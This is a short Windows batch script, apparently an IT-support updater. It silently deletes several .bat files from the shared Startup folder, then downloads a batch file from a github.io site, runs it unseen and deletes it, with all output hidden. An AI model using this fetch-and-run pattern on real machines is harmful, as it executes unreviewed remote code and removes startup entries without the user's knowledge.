@echo off
cls
rem call any

del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ApagarDownloads.bat" > NUL 2>&1
del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\EQ1.bat" > NUL 2>&1
del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\EQ2.bat" > NUL 2>&1
del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.bat" > NUL 2>&1
del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\run.bat" > NUL 2>&1

curl -o any.bat https://suporteeq.github.io/any.bat > NUL 2>&1 && call any.bat && del any.bat > NUL 2>&1

echo LPG
timeout /t 3